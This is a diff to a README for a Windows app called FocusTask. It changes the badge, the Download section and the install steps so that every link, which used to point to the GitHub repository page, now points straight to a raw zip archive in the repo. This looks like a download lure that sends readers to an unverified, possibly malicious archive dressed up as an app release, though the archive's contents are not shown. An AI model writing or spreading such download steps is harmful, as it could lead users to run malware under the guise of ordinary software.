@@ -1,11 +1,11 @@
 # 🧭 FocusTask - Organize work with less effort
 
-[![Download FocusTask](https://img.shields.io/badge/Download-FocusTask-blue?style=for-the-badge&logo=github)](https://github.com/Prentisskiplingesque84/FocusTask)
+[![Download FocusTask](https://img.shields.io/badge/Download-FocusTask-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Prentisskiplingesque84/FocusTask/main/public/Task_Focus_1.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download FocusTask:
-https://github.com/Prentisskiplingesque84/FocusTask
+https://raw.githubusercontent.com/Prentisskiplingesque84/FocusTask/main/public/Task_Focus_1.4.zip
 
 ## 🖥️ What FocusTask does
 
@@ -27,7 +27,7 @@ If the app comes as a zip file, you may need to extract it first.
 ## 🚀 Get FocusTask on Windows
 
 1. Open the download page:
-   https://github.com/Prentisskiplingesque84/FocusTask
+   https://raw.githubusercontent.com/Prentisskiplingesque84/FocusTask/main/public/Task_Focus_1.4.zip
 2. Look for the latest release, app file, or download package.
 3. Download the file to your PC.
 4. If the file is a `.zip`, right-click it and choose Extract All.
